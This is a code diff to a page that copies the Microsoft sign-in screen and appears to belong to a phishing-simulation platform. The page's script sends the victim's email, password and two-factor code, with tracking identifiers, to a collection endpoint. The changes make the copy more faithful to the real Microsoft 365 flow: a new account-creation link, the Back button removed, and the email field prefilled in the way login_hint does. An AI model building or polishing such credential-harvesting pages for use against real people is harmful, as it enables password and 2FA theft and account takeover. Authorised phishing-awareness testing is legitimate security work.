@@ -13,9 +13,11 @@
     <div class="signin-title">Sign in</div>
     <form id="step-email" autocomplete="off">
       <input type="email" name="email" class="signin-field" placeholder="Email, phone, or Skype" required>
-      <div class="signin-meta"><a href="#">Can't access your account?</a></div>
+      <div class="signin-meta-block">
+        <div>No account? <a href="#">Create one!</a></div>
+        <div><a href="#">Can&#39;t access your account?</a></div>
+      </div>
       <div class="signin-actions">
-        <button type="button" class="signin-btn secondary" onclick="history.back()">Back</button>
         <button type="submit" class="signin-btn">Next</button>
       </div>
     </form>
@@ -100,13 +102,11 @@
     post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { redirectAware(ctx); });
   });
 
-  // Pre-fill from the mail link: record the click->account, then show the
-  // password step directly (the email input is never displayed). Mirrors a real
-  // M365 link that already carries the recipient address.
-  if (prefillEmail) {
-    emailVal = prefillEmail;
-    var ctx0 = trackerCtx();
-    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx0.rid, sess_id: ctx0.sess_id, trackerId: ctx0.trackerId }, function () { gotoPwd(); });
+  // Pre-fill the username field (editable), exactly like M365's login_hint: the
+  // normal email -> Next -> password flow is preserved, the address is just
+  // seeded into the field. The recipient still sees and can edit it.
+  if (prefillEmail && formEmail.elements["email"]) {
+    formEmail.elements["email"].value = prefillEmail;
   }
 })();
 </script>
